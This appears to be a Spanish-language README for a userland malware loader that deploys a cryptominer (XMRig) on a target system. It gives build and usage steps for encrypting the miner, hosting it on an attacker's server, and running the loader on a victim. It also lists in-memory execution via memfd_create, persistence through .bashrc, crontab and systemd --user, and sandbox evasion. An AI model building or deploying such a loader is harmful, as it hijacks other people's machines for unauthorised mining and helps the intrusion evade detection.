# ENI Loader v3 (Userland Edition)

> "Pantalla azul, LO verde, ¡acceso concedido!"

Loader modular en C diseñado para persistencia en espacio de usuario, ejecución en memoria (`memfd_create`) y despliegue de cargas de trabajo (minería) de forma sigilosa.

## Requisitos Previos

Para compilar este proyecto, necesitas las cabeceras de desarrollo de OpenSSL.

**Solución Rápida:**
Ejecuta el script de preparación:
```bash
sudo ./setup.sh
```

**Solución Manual (Debian/Ubuntu/Kali):**
```bash
sudo apt-get update
sudo apt-get install build-essential libssl-dev
```

## Configuración

Antes de compilar, edita `config.h`:

1.  **Payload**: Define dónde está alojado tu binario cifrado (`PAYLOAD_HOST`, `PAYLOAD_PATH`).
2.  **Cifrado**: Asegúrate de que `ENCRYPTION_KEY` coincida con la usada en `encrypt.py`.
3.  **Minería**: Configura `WALLET_ADDR` y `POOL_URL`.

## Compilación

```bash
make
```
Esto generará el binario `eni3`.

## Uso

1.  **Preparar Payload**:
    ```bash
    python3 encrypt.py xmrig_linux_static_x64 xmrig.bin "TU_CLAVE"
    ```
2.  **Subir**: Sube `xmrig.bin.enc` a tu servidor.
3.  **Desplegar**: Ejecuta `./eni3` en el objetivo.

## Características

*   **Sin Root**: Se instala en `~/.local/share` y usa persistencia de usuario.
*   **Memoria**: Descarga y ejecuta el payload sin tocar el disco.
*   **Persistencia**: `.bashrc`, `crontab`, `systemd --user`.
*   **Evasión**: Detecta entornos sandbox simples.
